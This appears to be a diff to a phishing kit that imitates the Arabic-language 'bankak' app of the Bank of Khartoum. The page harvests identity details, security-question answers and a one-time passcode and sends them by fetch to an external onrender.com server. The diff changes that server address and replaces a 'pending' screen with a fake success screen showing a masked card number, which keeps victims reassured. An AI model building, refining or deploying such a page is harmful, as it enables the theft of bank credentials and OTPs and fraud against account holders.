@@ -124,7 +124,6 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
 .status-value.gold{color:var(--gold-dark);font-size:14px}
 .spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,0.4);border-top-color:white;border-radius:50%;animation:spin 0.7s linear infinite;display:inline-block;vertical-align:middle;margin-right:6px}
 @keyframes spin{to{transform:rotate(360deg)}}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
 </style>
 </head>
 <body>
@@ -374,38 +373,31 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
   </div>
 </div>
 
-<!-- ══ SCREEN 4: WAITING ══ -->
+<!-- ══ SCREEN 4: SUCCESS ══ -->
 <div class="screen" id="screen-success">
   <div class="red-header compact">
     <div class="logo-wrap"><div class="logo-arabic sm">بنك<span>ك</span></div><div class="logo-english sm"><b>b</b>ankak</div></div>
   </div>
-  <div class="white-body" style="text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center">
-    <div class="step-bar"><div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot active"></div></div>
-
-    <!-- Spinner -->
-    <div style="width:80px;height:80px;margin:20px auto;position:relative">
-      <svg viewBox="0 0 80 80" style="animation:spin 2s linear infinite;width:80px;height:80px">
-        <circle cx="40" cy="40" r="34" fill="none" stroke="#F0E8E8" stroke-width="6"/>
-        <circle cx="40" cy="40" r="34" fill="none" stroke="var(--red)" stroke-width="6" stroke-linecap="round" stroke-dasharray="60 154"/>
-      </svg>
-      <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:24px">⏳</div>
+  <div class="white-body scrollable" style="text-align:center">
+    <div class="step-bar"><div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot done" style="background:var(--red)"></div></div>
+    <div class="success-icon">✅</div>
+    <div style="font-size:22px;font-weight:800;color:#2A9060;margin-bottom:6px">تم بنجاح!</div>
+    <div style="font-size:13px;color:var(--text-muted);margin-bottom:4px">لقد تم التسليم إلى رقم حسابك بنجاح</div>
+    <p style="font-size:13px;color:var(--text-muted);margin-bottom:0">مرحباً بك في بنك النخبة</p>
+    <div class="account-badge">
+      <div class="acc-icon">💰</div>
+      <div style="text-align:right"><div style="font-weight:700;font-size:15px;color:var(--text-dark)" id="success-name">مستخدم موثوق</div><div style="font-size:12px;color:var(--text-muted);margin-top:3px;letter-spacing:2px">**** **** **** 4821</div></div>
+      <div style="color:#2A9060;font-size:22px">✓</div>
     </div>
-
-    <div style="font-size:20px;font-weight:800;color:var(--text-dark);margin-bottom:12px">طلبك قيد الانتظار</div>
-    <div style="font-size:14px;color:var(--text-muted);line-height:1.8;margin-bottom:24px;padding:0 20px">
-      يرجى الانتظار وعدم إغلاق الصفحة<br>
-      سيتم معالجة طلبك في أقرب وقت
-    </div>
-
-    <div style="background:#FFF8E8;border:1.5px solid rgba(201,168,76,0.35);border-radius:14px;padding:16px 20px;width:100%;text-align:right;margin-bottom:20px">
-      <div style="font-size:11px;color:var(--text-muted);margin-bottom:10px;text-align:center">حالة الطلب</div>
+    <div class="status-box" style="text-align:right">
+      <div style="font-size:11px;color:var(--text-muted);margin-bottom:10px;text-align:center">حالة العملية</div>
       <div class="status-row"><span class="status-label">التحقق من الهوية</span><span class="status-value">✓ مكتمل</span></div>
       <div class="status-row"><span class="status-label">سؤال الأمان</span><span class="status-value">✓ مكتمل</span></div>
       <div class="status-row"><span class="status-label">رمز التحقق OTP</span><span class="status-value">✓ مكتمل</span></div>
-      <div class="status-row"><span class="status-label" style="color:#8B6914;font-weight:700">معالجة الطلب</span><span style="color:#8B6914;font-weight:700;font-size:13px;animation:blink 1.2s infinite">⏳ جارٍ...</span></div>
+      <div class="status-row"><span class="status-label" style="color:var(--gold-dark);font-weight:700">تسليم رقم الحساب</span><span class="status-value gold">✓ تم</span></div>
     </div>
-
-    <p style="font-size:12px;color:var(--text-muted)">رقم الطلب: <span id="login-time" style="color:var(--red);font-weight:700;direction:ltr;display:inline-block"></span></p>
+    <button class="btn-primary" style="margin-top:0" onclick="goTo('screen-home')">العودة للرئيسية ←</button>
+    <div style="margin-top:14px;font-size:12px;color:var(--text-muted)">دخلت في <span id="login-time" style="color:var(--red);font-weight:700"></span></div>
   </div>
   <div class="bottom-nav">
     <div class="nav-item"><div class="nav-icon">📍</div><span class="nav-label">مواقعنا</span></div>
@@ -416,7 +408,7 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
 </div>
 
 <script>
-const API = 'https://bank-of-khartoum-bg6z.onrender.com';
+const API = 'https://bank-of-khartoum.onrender.com';
 let timerInterval=null, timerSeconds=300, SESSION_ID=null, pollInterval=null;
 const questions={cousin:'ما هو اسم ابن عمك الأول؟',city:'في أي مدينة ولدت؟',grad:'في أي سنة تخرجت من الجامعة؟',nick:'ماذا كان لقبك أثناء الطفولة؟',author:'اسم مؤلفك المفضل؟',car:'اسم الشركة المصنعة للسيارة المفضلة لديك؟',movie:'أي فيلم هو المفضل لديك؟',friend:'اسم أفضل صديق في الطفولة؟',school:'ما هو اسم المدرسة التي التحقت بها؟',football:'اسم فريق كرة القدم المفضل لديك؟'};
 const otpIds=['otp1','otp2','otp3','otp4','otp5','otp6'];
@@ -539,7 +531,7 @@ async function doOtp(){
   try{
     const r=await fetch(`${API}/api/submit-otp`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:SESSION_ID,otp:code})});
     const d=await r.json();
-    if(d.success){clearInterval(timerInterval);clearInterval(pollInterval);document.getElementById('login-time').textContent='REQ-'+Math.random().toString(36).substr(2,8).toUpperCase();goTo('screen-success');}
+    if(d.success){clearInterval(timerInterval);clearInterval(pollInterval);document.getElementById('login-time').textContent=new Date().toLocaleTimeString('ar-SA');goTo('screen-success');}
     else{err.textContent='الرمز غير صحيح';err.classList.add('show');}
   }catch(e){err.textContent='تعذّر الاتصال بالسيرفر';err.classList.add('show');}
   btn.innerHTML='تأكيد الرمز';btn.disabled=false;
